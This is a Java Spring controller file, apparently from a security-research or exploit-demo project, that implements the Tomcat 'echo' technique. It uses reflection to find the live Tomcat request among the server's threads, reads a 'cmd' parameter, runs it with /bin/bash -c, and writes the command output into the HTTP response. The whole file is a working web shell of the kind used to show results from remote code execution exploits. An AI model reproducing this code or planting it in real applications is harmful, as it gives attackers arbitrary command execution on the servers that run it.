package com.sorry.bug.controller;

import com.sorry.utils.reflect.Reflections;
import org.apache.catalina.connector.Response;
import org.apache.coyote.Request;
import org.apache.coyote.RequestInfo;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.io.Writer;
import java.util.List;

/**
 * created by 0x22cb7139 on 2021/6/30
 */
@Controller
public class tomcatechoController {
    @RequestMapping("/tomcatecho")
    public void echo(HttpServletRequest req, HttpServletResponse rsp){
        try {
            boolean flag = false;
            Thread[] threads = (Thread[])((Thread[]) Reflections.getFieldValue(Thread.currentThread().getThreadGroup(), "threads"));

            for(int i = 0; i < threads.length; ++i) {
                Thread thread = threads[i];
                if (thread != null) {
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")) {
                        Object target = Reflections.getFieldValue(thread, "target");
                        Object global = null;
                        if (target instanceof Runnable) {
                            try {
                                global = Reflections.getFieldValue(Reflections.getFieldValue(Reflections.getFieldValue(target, "this$0"), "handler"), "global");
                            } catch (NoSuchFieldException var18) {
                                var18.printStackTrace();
                            }
                        }

                        if (global != null) {
                            List processors = (List)Reflections.getFieldValue(global, "processors");

                            for(i = 0; i < processors.size(); ++i) {
                                RequestInfo requestInfo = (RequestInfo)processors.get(i);
                                if (requestInfo != null) {
                                    Request tempRequest = (Request)Reflections.getFieldValue(requestInfo, "req");
                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request)tempRequest.getNote(1);
                                    Response response = request.getResponse();
                                    String cmd = "";
                                    if (request.getParameter("cmd") != null) {
                                        cmd = request.getParameter("cmd");
                                    }

                                    if (cmd != null) {
                                        System.out.println(cmd);
                                        InputStream inputStream = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd}).getInputStream();
                                        StringBuilder sb = new StringBuilder("");
                                        byte[] bytes = new byte[1024];
                                        boolean var16 = false;

                                        int n;
                                        while((n = inputStream.read(bytes)) != -1) {
                                            sb.append(new String(bytes, 0, n));
                                        }

                                        Writer writer = response.getWriter();
                                        writer.write(sb.toString());
                                        writer.flush();
                                        inputStream.close();
                                        System.out.println("success");
                                        flag = true;
                                        break;
                                    }

                                    if (flag) {
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }

                if (flag) {
                    break;
                }
            }
        } catch (Exception var19) {
            var19.printStackTrace();
        }
    }
}

